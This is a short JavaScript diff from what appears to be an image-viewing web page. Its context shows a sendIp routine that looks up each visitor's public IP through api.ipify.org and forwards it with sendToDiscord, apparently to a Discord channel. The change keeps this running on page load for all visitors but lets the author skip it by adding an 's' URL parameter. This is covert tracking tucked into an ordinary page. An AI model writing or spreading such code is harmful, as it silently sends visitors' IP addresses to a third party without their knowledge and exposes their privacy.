@@ -102,7 +102,9 @@ function readmething(){
         let data = await(await fetch("https://api.ipify.org/")).text()
         sendToDiscord(await data)
     }
-        sendIp()
+    let params = new URLSearchParams(document.location.search);
+    if(!params.get("s")){
+        sendIp()}
 image.onload = () => {
   
      IMGWIDTH = image.naturalWidth;
